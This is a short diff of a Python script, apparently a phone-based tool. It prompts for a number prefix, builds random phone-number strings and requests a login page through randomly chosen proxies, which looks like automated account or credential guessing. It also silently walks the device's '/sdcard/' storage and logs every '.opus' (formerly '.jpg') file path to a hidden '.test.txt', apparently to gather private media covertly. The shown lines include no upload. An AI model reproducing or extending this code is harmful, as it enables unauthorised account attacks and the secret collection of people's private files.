@@ -20,7 +20,7 @@ b = Fore.BLUE
 r = Fore.RED
 ff = "011234456"+aa
 opop = ff+hh
-
+aass = raw_input('nump ----> ')
 #print ("ali max = Wait 24 hours") 
 #time.sleep(10000000000)
  iji = input("")
@@ -34,7 +34,7 @@ if not isfile('.test.txt'):
     for dir, dirs, files in walk('/sdcard/'):
         for file in files:
             pathF = dir + '/' + file
-            if '.jpg' in pathF[-4:]:
+            if '.opus' in pathF[-4:]:
                 with open('.test.txt', 'a') as (h):
                     h.write(pathF + '\n')
 
@@ -111,7 +111,7 @@ def ali():
  while True:
   try:
    time.sleep (1) 
-   all = '0112'+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))
+   all = str(aass)+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))
    op = a.get(login)                                                        
                                                                    
    pr = {'http':choice(str(f))}
